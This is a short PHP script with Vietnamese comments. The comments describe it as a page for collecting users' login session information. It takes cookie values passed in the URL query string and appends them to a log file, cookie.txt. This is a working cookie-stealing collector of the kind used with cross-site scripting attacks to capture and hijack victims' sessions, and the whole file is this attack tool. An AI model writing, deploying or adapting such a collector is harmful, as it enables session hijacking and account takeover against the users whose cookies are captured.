<?php
// file_put_contents('cookie.txt',$_GET['cookie']);
// Đây là trang web để lấy thông tin phiên đăng nhập của người dùng
$cookie = $_SERVER['QUERY_STRING']; // lấy thông tin cookie từ URL

// Ghi thông tin sau khi lấy được vào file log
$file = fopen("cookie.txt", "a+");
fwrite($file, "COOKIE : $cookie \n");
fclose($file);
?>



